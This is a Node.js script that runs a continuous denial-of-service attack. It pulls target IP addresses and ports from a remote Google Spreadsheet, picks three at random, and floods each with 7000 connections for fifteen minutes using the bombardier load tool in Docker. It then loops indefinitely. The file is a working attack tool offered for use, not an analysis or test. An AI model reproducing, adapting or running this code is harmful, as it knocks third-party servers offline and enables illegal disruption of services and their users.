require("dotenv").config();
const { GoogleSpreadsheet } = require("google-spreadsheet");
const Docker = require("dockerode");
const docker = new Docker();

const doc = new GoogleSpreadsheet(
  "1CGimNXk_8zQoIHoVPC_XvtbIqEt2QiWR4LDtAgzRtmU"
);

const TARGET_COUNT = 3;
const ATTACK_TIME_SECONDS = 900;
const ATTACK_CONNECTIONS_COUNT = 7000;
const DOCKER_IMAGE = "alpine/bombardier";
const SUCCESS_SLEEP_SECONDS = 30;

const sleep = (ms) => new Promise((res) => setTimeout(res, ms));

const runDocker = (source) => {
  const options = [
    `--duration=${ATTACK_TIME_SECONDS}s`,
    `--connections=${ATTACK_CONNECTIONS_COUNT}`,
    source,
  ];

  return docker
    .run(DOCKER_IMAGE, options, process.stdout)
    .then((data) => {
      // var output = data[0];
      var container = data[1];
      // console.log(output.StatusCode);
      return container.remove();
    })
    .then(() => {
      console.log("container removed");
    })
    .catch((err) => {
      console.log("catch", err);
    });
};

const ddos = async (c = 1) => {
  const count = c;
  console.log(`DDOS ${count} stared!`);

  // https://theoephraim.github.io/node-google-spreadsheet/#/getting-started/authentication
  await doc.useServiceAccountAuth({
    client_email: process.env.CLIENT_EMAIL,
    private_key: process.env.PRIVATE_KEY,
  });
  await doc.loadInfo();

  const sheet = doc.sheetsByIndex[5];
  const rows = await sheet.getRows({ limit: 20 });

  const randomRows = rows
    .sort(() => Math.random() - 0.5)
    .slice(0, TARGET_COUNT);

  for (let i = 0; i < randomRows.length; i++) {
    const { IP, PORT, DESCRIPTION } = randomRows[i];
    console.log(`DDOS => ${IP}:${PORT} (${DESCRIPTION})`);
    runDocker(`${IP}:${PORT}`);
  }

  await sleep((ATTACK_TIME_SECONDS + SUCCESS_SLEEP_SECONDS) * 1000);
  console.log(`DDOS ${count} done! Sleep ${SUCCESS_SLEEP_SECONDS} sec`);

  ddos(count + 1);
};

ddos();
